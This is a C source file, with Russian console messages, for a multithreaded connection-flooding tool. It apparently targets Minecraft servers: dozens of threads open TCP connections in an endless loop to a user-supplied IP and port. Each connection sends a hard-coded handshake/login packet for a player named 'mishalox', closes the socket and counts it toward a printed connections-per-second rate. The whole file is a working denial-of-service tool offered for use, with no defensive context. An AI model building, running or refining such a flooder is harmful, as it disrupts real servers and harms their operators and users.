#include <stdlib.h>
#include <stdio.h>
#include <sys/epoll.h>
#include <errno.h>
#include <arpa/inet.h>
#include <malloc.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <event.h>

#define MAX_MISHALOX_EVENTS 1024

typedef struct mishalox_data_s {
    struct sockaddr* sockaddr_loxa;
    int epollfd;
    int connections;
    int time;
} mishalox_data_t;

const uint8_t data[] = {
        0x0F, 0x00, 0x2F, 0x09, 'l', 'o', 'c', 'a', 'l', 'h', 'o', 's', 't', 0xDD, 0x63, 0x02,
        0x0A, 0x00, 0x08, 'm', 'i', 's', 'h', 'a', 'l', 'o', 'x'
};

_Noreturn void* mishalox_epoll_thread(void* arg) {
    mishalox_data_t* mishalox = (mishalox_data_t*) arg;
    struct epoll_event events[MAX_MISHALOX_EVENTS];

    while (mishalox->epollfd) {
        int event_count = epoll_wait(mishalox->epollfd, events, MAX_MISHALOX_EVENTS, -1);
        for (int i = 0; i < event_count; i++) {
            int sockfd = events[i].data.fd;
            if (events[i].events & EPOLLOUT) {
                write(sockfd, data, 27);

                close(sockfd);
                ++mishalox->connections;
            }
        }
    }
}

struct sockaddr* mishalox_new_sockaddr(const char* ip, int port) {
    struct sockaddr_in* sockaddr = calloc(1, sizeof(struct sockaddr_in));
    sockaddr->sin_family = AF_INET;
    sockaddr->sin_port = htons(port);
    if (!inet_pton(AF_INET, ip, &sockaddr->sin_addr.s_addr)) {
        return NULL;
    }

    return (struct sockaddr*) sockaddr;
}

int mishalox_connect(mishalox_data_t* mishalox) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return -1;
    }

    struct epoll_event event;
    event.events = EPOLLOUT | EPOLLET;
    event.data.fd = sockfd;
    epoll_ctl(mishalox->epollfd, EPOLL_CTL_ADD, sockfd, &event);

    int r = connect(sockfd, mishalox->sockaddr_loxa, sizeof(struct sockaddr));
    if (r && errno != EINPROGRESS) {
        return -2;
    }

    return 0;
}

void mishalox_beautiful_notifications(int fd, short event, void* arg) {
    mishalox_data_t* mishalox = (mishalox_data_t*) arg;

    mishalox->time += 5;
    printf("Всего мишалохов за %d секунд: %d | Мишалохов в секунду: %f\n",
           mishalox->time, mishalox->connections, (double) mishalox->connections / mishalox->time);
}

void* mishalox_connection_thread(void* arg) {
    mishalox_data_t* mishalox = (mishalox_data_t*) arg;

    while (mishalox->epollfd) {
        mishalox_connect(mishalox);
    }
}

int main(int argc, char** argv) {
    if (argc < 3) {
        fprintf(stderr, "Слишком мало аргументов для мишалохов!!!\n");
        return -1;
    }

    int epoll_threads = 256;
    if (argc >= 4) {
        epoll_threads = atoi(argv[3]);
    }

    int connect_threads = 64;
    if (argc >= 5) {
        connect_threads = atoi(argv[4]);
    }

    mishalox_data_t* mishalox = calloc(1, sizeof(mishalox_data_t));
    mishalox->sockaddr_loxa = mishalox_new_sockaddr(argv[1], atoi(argv[2]));

    signal(SIGPIPE, SIG_IGN);

    mishalox->epollfd = epoll_create1(0);
    if (mishalox->epollfd < 0) {
        fprintf(stderr, "Не получается создать еполл для мишалохов\n");
        return errno;
    }

    printf("Запуск мишалохов на %s:%s в %d/%d потоках\n", argv[1], argv[2], epoll_threads, connect_threads);

    for (int i = 0; i < epoll_threads; i++) {
        pthread_t thread;
        pthread_create(&thread, NULL, mishalox_epoll_thread, mishalox);
        pthread_detach(thread);
    }

    for (int i = 0; i < connect_threads; i++) {
        pthread_t thread;
        pthread_create(&thread, NULL, mishalox_connection_thread, mishalox);
        pthread_detach(thread);
    }

    struct event ev;
    struct timeval tv;

    tv.tv_sec = 5;
    tv.tv_usec = 0;

    event_init();
    event_set(&ev, 0, EV_PERSIST, mishalox_beautiful_notifications, mishalox);
    evtimer_add(&ev, &tv);
    event_dispatch();

    free(mishalox->sockaddr_loxa);
    free(mishalox);

    return 0;
}
